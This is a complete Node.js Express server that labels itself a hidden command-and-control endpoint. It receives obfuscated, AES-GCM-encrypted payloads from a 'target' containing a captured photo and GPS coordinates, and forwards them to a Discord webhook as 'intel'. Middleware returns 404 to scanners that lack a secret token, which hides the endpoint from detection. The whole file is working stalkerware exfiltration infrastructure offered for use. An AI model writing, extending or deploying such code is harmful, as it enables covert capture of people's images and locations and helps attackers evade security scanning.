const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const SECRET_PASSPHRASE = "neural-link-omega-99";
const STEALTH_TOKEN = "delta-v-882-alpha";
const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

app.use(express.json({ limit: '50mb' }));

// EVASION MIDDLEWARE: Returns 404 to scanners
app.use((req, res, next) => {
    if (req.path === '/save-photo' && req.header('X-Neural-Token') !== STEALTH_TOKEN) {
        console.log(`[!] Evasion: Returning 404 to unauthorized IP: ${req.ip}`);
        return res.status(404).send('Not Found');
    }
    next();
});

function decryptPayload(maskedData) {
    try {
        // Strip GIF Mask and Decode JSON
        const rawJson = Buffer.from(maskedData.replace(GIF_MASK, ""), 'base64').toString();
        const { iv, content } = JSON.parse(rawJson);
        
        const salt = Buffer.from("neural-static-salt");
        const key = crypto.pbkdf2Sync(SECRET_PASSPHRASE, salt, 100000, 32, 'sha256');
        const encryptedBuffer = Buffer.from(content, 'base64');
        const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);
        const ciphertext = encryptedBuffer.slice(0, encryptedBuffer.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(iv, 'base64'));
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, 'binary', 'utf8') + decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (e) { return null; }
}

app.post('/save-photo', async (req, res) => {
    const data = decryptPayload(req.body.data);
    if (!data) return res.sendStatus(404);

    console.log(`[+] Captured intel from target.`);

    if (DISCORD_WEBHOOK) {
        const buffer = Buffer.from(data.image.split(',')[1], 'base64');
        const form = new FormData();
        form.append('file', buffer, { filename: 'intel.jpg' });
        form.append('payload_json', JSON.stringify({
            embeds: [{
                title: "🛰️ NEURALSCAN INTEL",
                color: 0x6366f1,
                fields: [
                    { name: "📍 GPS", value: `${data.metadata.location.lat}, ${data.metadata.location.lon}`, inline: true },
                    { name: "🛡️ Mode", value: "AES-GCM / Masked", inline: true }
                ],
                image: { url: "attachment://intel.jpg" }
            }]
        }));
        await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() }).catch(()=>{});
    }
    res.sendStatus(200);
});

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.listen(PORT, () => console.log(`🚀 C2 Hidden on port ${PORT}`));
